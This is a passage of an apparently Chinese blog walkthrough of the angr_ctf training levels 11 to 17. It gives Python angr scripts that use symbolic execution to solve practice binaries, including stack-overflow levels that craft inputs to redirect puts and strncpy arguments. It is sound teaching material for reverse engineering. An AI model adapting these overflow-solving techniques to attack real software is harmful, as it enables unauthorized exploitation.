class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">scanf_sym = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">io.hook_symbol(scanf_sym,Hook())</span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = is_succ,avoid=is_fail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    so0 = so_state.<span class="built_in">globals</span>[<span class="string">&#x27;so0&#x27;</span>] <span class="comment">#访问全局变量，获取指定的位向量</span></span><br><span class="line">    so1 = so_state.<span class="built_in">globals</span>[<span class="string">&#x27;so1&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    scanf0_so = so_state.solver.<span class="built_in">eval</span>(so0) <span class="comment">#求解</span></span><br><span class="line">    scanf1_so = so_state.solver.<span class="built_in">eval</span>(so1)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(scanf0_so))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(scanf1_so))</span><br></pre></td></tr></table></figure><h2 id="Veritesting"><a href="#Veritesting" class="headerlink" title="Veritesting"></a>Veritesting</h2><h3 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251001231651918.png" alt="image-20251001231651918"></p><p>程序将进行一个按位的加密，这里将会出现路径爆炸，angr提供了veritesting去避免路径爆炸，只需启用即可</p><blockquote><p>符号执行，一种是动态符号执行（Dynamic Symbolic Execution，简称DSE），另一种是静态符号执行（Static Symbolic Execution，简称SSE）。</p><p>动态符号执行会去执行程序然后为每一条路径生成一个表达式。在生成表达式上引入了很多的开销，然而生成的表达式很容易求解。</p><p>而静态符号执行将程序转换为表达式，每个表达式都表示任意条路径的属性生成表达式容易，但是表达式难求解。</p><p>veritesting就是在这二者中做权衡，使得能够在引入低开销的同时，生成较易求解的表达式。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/12_angr_veritesting&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">simgr = io.factory.simgr(init_state, veritesting=<span class="literal">True</span>)  <span class="comment"># 开启veritesting</span></span><br><span class="line"></span><br><span class="line">simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    so0 = so_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h3><p>和00_angr_find唯一的区别是二进制文件被编译为静态二进制文件,我们主动替换库函数避免路径爆炸和加速。</p><p>angr提供了写好的SimProcdure，我们直接索引到对应的函数然后hook就行。</p><p>就像本来strcmp的实现也是按位比较，但是在前面为什么不会在strcmp上发生路径爆炸，因为angr已经自动给这些函数hook了</p><p>但是用静态编译，angr没法自动hook，需要手动去hook在使用的标准库的C函数：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251001232741998.png" alt="image-20251001232741998"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;/home/closure/Desktop/CTF/angr_ctf/dist/13_angr_static_binary&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#手动hook       </span></span><br><span class="line">io.hook(<span class="number">0x804ed80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">io.hook(<span class="number">0x804ed40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">io.hook(<span class="number">0x804f350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">io.hook(<span class="number">0x8048280</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">io.hook_symbol(<span class="string">&#x27;__libc_start_main&#x27;</span>,angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())     </span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = is_succ,avoid=is_fail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    so0 = so_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h3 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251001233034537.png" alt="image-20251001233034537"></p><p>validate来自动态链接库lib14_angr_shared_library.so</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251001233237945.png" alt="image-20251001233237945"></p><p>我们指定下共享库的基地址加上偏移就能定位到validate。这里用到一个新的内置state：call_state</p><ol><li>.blank_state()：空白状态，其大部分数据未初始化。 访问未初始化的数据时，将返回一个不受约束的符号值。</li><li>.entry_state() ：构造一个准备在主二进制文件入口点执行的状态。</li><li>.full_init_state()：通过需要在主二进制文件入口点之前运行的任何初始化程序构造一个准备执行的状态</li><li>.call_state()：构造一个准备好执行给定函数的状态。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    std_out = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">libc_so = <span class="string">&#x27;/home/closure/Desktop/CTF/angr_ctf/dist/lib14_angr_shared_library.so&#x27;</span></span><br><span class="line">libc_base = <span class="number">0x8048000</span> <span class="comment">#基地址</span></span><br><span class="line">io = angr.Project(libc_so,load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;custom_base_addr&#x27;</span>:libc_base <span class="comment">#基地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">validate_addr = libc_base + <span class="number">0x6D7</span> <span class="comment"># + 偏移 = 目标函数地址</span></span><br><span class="line"></span><br><span class="line">buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>) <span class="comment">#位向量，0x3000000为缓冲区地址，只要不影响程序执行即可</span></span><br><span class="line"></span><br><span class="line">init_state = io.factory.call_state(validate_addr, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">init_state.memory.store(buffer_pointer, password)</span><br><span class="line"></span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">success_address = libc_base + <span class="number">0x783</span></span><br><span class="line">simgr.explore(find=success_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    so_state.add_constraints(so_state.regs.eax == <span class="number">1</span>)</span><br><span class="line">    so0 = so_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">format</span>(so0.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure><h2 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h2><h3 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h3><p>程序通过scanf获取输入，第一个key经过校验后将使用puts输出，但是都为try_again，但是一个s（try_again）在栈上，而我们的第二个输入也将写入栈上，并且输入长度并没有限制，也就是说可以覆盖s为Good Job.</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002185442659.png" alt="image-20251002185442659"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002185516504.png" alt="image-20251002185516504"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">io = angr.Project(<span class="string">&#x27;./dist/15_angr_arbitrary_read&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hook</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment"># hook scanf</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, format_string, key_addr, password_addr</span>):</span><br><span class="line">        <span class="comment"># 无符号整数</span></span><br><span class="line">        key_bvs = claripy.BVS(<span class="string">&#x27;key_bvs&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        <span class="comment"># padding 20个字符 * 8 = 160比特</span></span><br><span class="line">        password_addr_bvs = claripy.BVS(<span class="string">&#x27;password_addr_bvs&#x27;</span>, <span class="number">20</span> * <span class="number">8</span>)</span><br><span class="line">        <span class="comment"># 确保字符串中的每个字符都是可打印的，安装8比特1字符分组</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> password_addr_bvs.chop(bits=<span class="number">8</span>):</span><br><span class="line">            <span class="variable language_">self</span>.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            key_addr,</span><br><span class="line">            key_bvs,</span><br><span class="line">            endness=io.arch.memory_endness</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            password_addr,</span><br><span class="line">            password_addr_bvs</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (key_bvs, password_addr_bvs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scanf_sym = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">io.hook_symbol(scanf_sym, Hook())</span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否为正确状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># 根据调用puts判断</span></span><br><span class="line">    jmp_puts_addr = <span class="number">0x8048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr != jmp_puts_addr: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    goodjob_addr = <span class="number">0x484F4A47</span></span><br><span class="line">    <span class="comment"># 提取数据</span></span><br><span class="line">    puts_param = state.memory.load(state.regs.esp + <span class="number">4</span>,</span><br><span class="line">                                   <span class="number">4</span>,</span><br><span class="line">                                   endness=io.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(puts_param):</span><br><span class="line">        <span class="comment"># 拷贝状态，不对原状态产生影响</span></span><br><span class="line">        cp_state = state.copy()</span><br><span class="line">        <span class="comment"># 判断提取出来的数据是否是为目标字符串所在地址</span></span><br><span class="line">        cp_state.add_constraints(puts_param == goodjob_addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cp_state.satisfiable():</span><br><span class="line">            <span class="comment"># 正确则返回</span></span><br><span class="line">            state.add_constraints(puts_param == goodjob_addr)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">simgr.explore(find=success)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    (key_so, password_so) = so_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    so0 = so_state.solver.<span class="built_in">eval</span>(key_so)</span><br><span class="line">    so1 = so_state.solver.<span class="built_in">eval</span>(password_so, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(so0, so1)</span><br></pre></td></tr></table></figure><h3 id="16-angr-arbitrary-write"><a href="#16-angr-arbitrary-write" class="headerlink" title="16_angr_arbitrary_write"></a>16_angr_arbitrary_write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;/home/closure/Desktop/CTF/angr_ctf/dist/16_angr_arbitrary_write&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hook</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment">#hook scanf</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,format_string,key_addr,password_addr</span>):</span><br><span class="line">        key_bvs = claripy.BVS(<span class="string">&#x27;key_bvs&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">        password_addr_bvs = claripy.BVS(<span class="string">&#x27;password_addr_bvs&#x27;</span>,<span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> password_addr_bvs.chop(bits=<span class="number">8</span>):</span><br><span class="line">                <span class="variable language_">self</span>.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            key_addr,</span><br><span class="line">            key_bvs,</span><br><span class="line">            endness = io.arch.memory_endness</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            password_addr,</span><br><span class="line">            password_addr_bvs</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (key_bvs, password_addr_bvs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">state</span>):</span><br><span class="line">     <span class="comment">#调用strncpy</span></span><br><span class="line">     strncpy_addr = <span class="number">0x8048410</span></span><br><span class="line">     <span class="keyword">if</span> state.addr == strncpy_addr:</span><br><span class="line">          <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#从上一题检查puts变为检查strncpy</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_strncpy</span>(<span class="params">state</span>):</span><br><span class="line">     <span class="comment">#3个参数获取</span></span><br><span class="line">     strncpy_dest = state.memory.load(state.regs.esp+<span class="number">4</span>,</span><br><span class="line">                                   <span class="number">4</span>,</span><br><span class="line">                                   endness = io.arch.memory_endness)</span><br><span class="line">    <span class="comment">#注意这边获取的是地址</span></span><br><span class="line">     strncpy_src_addr = state.memory.load(state.regs.esp+<span class="number">8</span>,</span><br><span class="line">                                   <span class="number">4</span>,</span><br><span class="line">                                   endness = io.arch.memory_endness)</span><br><span class="line">     strncpy_len = state.memory.load(state.regs.esp+<span class="number">12</span>,</span><br><span class="line">                                   <span class="number">4</span>,</span><br><span class="line">                                   endness = io.arch.memory_endness)</span><br><span class="line">    <span class="comment">#这里获取的才是数据，请注意参考函数原型</span></span><br><span class="line">     src_contents = state.memory.load(strncpy_src_addr,strncpy_len)</span><br><span class="line">     <span class="keyword">if</span> state.solver.symbolic(src_contents) <span class="keyword">and</span> state.solver.symbolic(strncpy_dest):</span><br><span class="line">          password_str = <span class="string">&quot;NDYNWEUJ&quot;</span></span><br><span class="line">          buffer_addr = <span class="number">0x57584344</span></span><br><span class="line">          <span class="comment">#两项约束条件</span></span><br><span class="line"> <span class="comment">#小端序获取字符串，验证src是否为目标字符串</span></span><br><span class="line">          check_content_password = src_contents[-<span class="number">1</span>:-<span class="number">64</span>] == password_str</span><br><span class="line">          <span class="comment">#验证dest是否为password_buffer</span></span><br><span class="line">          check_dest_buffer_addr = strncpy_dest == buffer_addr</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> state.satisfiable(extra_constraints = (check_content_password,check_dest_buffer_addr)):</span><br><span class="line">               state.add_constraints(check_content_password,check_dest_buffer_addr)</span><br><span class="line">                <span class="comment">#条件通过</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scanf_sym = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">io.hook_symbol(scanf_sym,Hook())        </span><br><span class="line">simgr = io.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = success)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    (key_so,password_so) = so_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    so0 = so_state.solver.<span class="built_in">eval</span>(key_so)</span><br><span class="line">    so1 = so_state.solver.<span class="built_in">eval</span>(password_so,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(so0,so1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="17-angr-arbitrary-jump"><a href="#17-angr-arbitrary-jump" class="headerlink" title="17_angr_arbitrary_jump"></a>17_angr_arbitrary_jump</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 